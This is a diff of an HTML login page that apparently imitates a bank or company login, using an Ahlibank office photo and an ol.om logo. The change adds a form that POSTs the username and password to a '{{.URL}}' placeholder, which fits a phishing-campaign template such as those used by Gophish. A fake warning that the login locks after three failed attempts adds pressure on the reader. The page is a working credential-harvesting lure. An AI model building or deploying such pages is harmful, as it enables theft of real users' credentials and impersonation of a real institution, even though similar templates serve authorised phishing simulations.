@@ -1,112 +1,138 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-	<title>Landing Page</title>
-	<style type="text/css">body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            font-family: 'Open Sans', Meiryo, sans-serif;
-        }
-        .background {
-            background-image: url('https://archello.s3.eu-central-1.amazonaws.com/images/2021/12/02/wael-al-masri-planners--amp--architects-ahlibank-head-office-offices-archello.1638430843.6686.jpg');
-            background-size: cover;
-            background-position: center;
-            height: 100%;
-            width: 100%;
-            display: flex;
-            justify-content: flex-start; /* Align to the left */
-            align-items: center;
-        }
-        .login-container {
-            background-color: rgba(0, 0, 0, 0.4); /* Semi-transparent black background */
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: left; /* Align text to the left */
-            width: 25%; /* Set width of the container */
-            height: auto; /* Adjust height based on content */
-            margin-left: 50px; /* Margin from the left of the page */
-            margin-top: 50px; /* Margin from the top */
-            box-sizing: border-box; /* Include padding and border in the element's total width and height */
-        }
-        .login-container img {
-            max-width: 100%;
-            height: auto;
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin-top: 20px; /* Margin between fields */
-            direction: ltr; /* Left-to-right text direction */
-            text-align: left; /* Align text to the left */
-            border-radius: 15px;
-            height: 45px;
-            font-size: 14px; /* Font size for input fields */
-            color: #333; /* Text color for inputs */
-            box-sizing: border-box; /* Include padding and border in the element's total width and height */
-        }
-        .login-container input::placeholder {
-            color: #777; /* Placeholder text color */
-            font-size: 14px; /* Font size for placeholders */
-        }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1F497D; /* Button color */
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px; /* Font size for button text */
-            margin-top: 20px; /* Margin at the top of the button */
-            font-family: 'Open Sans', Meiryo, sans-serif; /* Font family for button */
-        }
-        .login-container button:hover {
-            background-color: #123456; /* Slightly darker shade for hover effect */
-        }
-        .login-container .links {
-            display: flex;
-            justify-content: space-between; /* Space between links */
-            margin-top: 10px; /* Margin above the links */
-        }
-        .login-container a {
-            color: white; /* Link color */
-            font-size: 14px;
-            text-decoration: none;
-        }
-        .login-container a:hover {
-            text-decoration: underline;
-        }
-        .warning {
-            display: block;
-            width: 100%;
-            color: rgb(255, 217, 0); /* Warning text color */
-            font-size: 11px; /* Font size for warning text */
-            padding: 0px 5px;
-            margin-top: 10px; /* Margin above the warning text */
-        }
-        .additional-info {
-            width: 110%;
-            display: inline-block;
-            vertical-align: top;
-            color: rgb(255, 255, 255); /* Additional info text color */
-            font-size: 10px; /* Font size for additional info text */
-            margin: 10px 0px 0px;
-            padding: 0px 5px;
-        }
-	</style>
-</head>
-<body>
-<div class="background">
-<div class="login-container"><img alt="Logo" src="https://ol.om/wp-content/uploads/2024/07/IMG_7139.png"/> <input placeholder="Username" type="text"/> <input placeholder="Password" type="password"/><button type="submit">Login</button>
-<div class="links"><a href="#">Forgot Username?</a> <a href="#">Forgot Password?</a></div>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Landing Page</title>
+    <style type="text/css">
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        font-family: "Open Sans", Meiryo, sans-serif;
+      }
+      .background {
+        background-image: url("https://archello.s3.eu-central-1.amazonaws.com/images/2021/12/02/wael-al-masri-planners--amp--architects-ahlibank-head-office-offices-archello.1638430843.6686.jpg");
+        background-size: cover;
+        background-position: center;
+        height: 100%;
+        width: 100%;
+        display: flex;
+        justify-content: flex-start; /* Align to the left */
+        align-items: center;
+      }
+      .login-container {
+        background-color: rgba(
+          0,
+          0,
+          0,
+          0.4
+        ); /* Semi-transparent black background */
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        text-align: left; /* Align text to the left */
+        width: 25%; /* Set width of the container */
+        height: auto; /* Adjust height based on content */
+        margin-left: 50px; /* Margin from the left of the page */
+        margin-top: 50px; /* Margin from the top */
+        box-sizing: border-box; /* Include padding and border in the element's total width and height */
+      }
+      .login-container img {
+        max-width: 100%;
+        height: auto;
+        margin-bottom: 20px;
+      }
+      .login-container input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 20px; /* Margin between fields */
+        direction: ltr; /* Left-to-right text direction */
+        text-align: left; /* Align text to the left */
+        border-radius: 15px;
+        height: 45px;
+        font-size: 14px; /* Font size for input fields */
+        color: #333; /* Text color for inputs */
+        box-sizing: border-box; /* Include padding and border in the element's total width and height */
+      }
+      .login-container input::placeholder {
+        color: #777; /* Placeholder text color */
+        font-size: 14px; /* Font size for placeholders */
+      }
+      .login-container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #1f497d; /* Button color */
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px; /* Font size for button text */
+        margin-top: 20px; /* Margin at the top of the button */
+        font-family: "Open Sans", Meiryo, sans-serif; /* Font family for button */
+      }
+      .login-container button:hover {
+        background-color: #123456; /* Slightly darker shade for hover effect */
+      }
+      .login-container .links {
+        display: flex;
+        justify-content: space-between; /* Space between links */
+        margin-top: 10px; /* Margin above the links */
+      }
+      .login-container a {
+        color: white; /* Link color */
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .login-container a:hover {
+        text-decoration: underline;
+      }
+      .warning {
+        display: block;
+        width: 100%;
+        color: rgb(255, 217, 0); /* Warning text color */
+        font-size: 11px; /* Font size for warning text */
+        padding: 0px 5px;
+        margin-top: 10px; /* Margin above the warning text */
+      }
+      .additional-info {
+        width: 110%;
+        display: inline-block;
+        vertical-align: top;
+        color: rgb(255, 255, 255); /* Additional info text color */
+        font-size: 10px; /* Font size for additional info text */
+        margin: 10px 0px 0px;
+        padding: 0px 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="background">
+      <div class="login-container">
+        <img
+          alt="Logo"
+          src="https://ol.om/wp-content/uploads/2024/07/IMG_7139.png"
+        />
+        <form method="POST" action="{{.URL}}">
+        <input placeholder="Username" type="text" />
+        <input placeholder="Password" type="password" /><button type="submit">
+          Login
+        </button>
+        </form>
+        <div class="links">
+          <a href="#">Forgot Username?</a> <a href="#">Forgot Password?</a>
+        </div>
 
-<div class="warning">Warning: Please ensure all details are correct!</div>
+        <div class="warning">
+          Warning: Please ensure all details are correct!
+        </div>
 
-<div class="additional-info">Your Login will get locked after 3 unsuccessful attempts.</div>
-</div>
-</div>
-
-
-</body></html>
+        <div class="additional-info">
+          Your Login will get locked after 3 unsuccessful attempts.
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
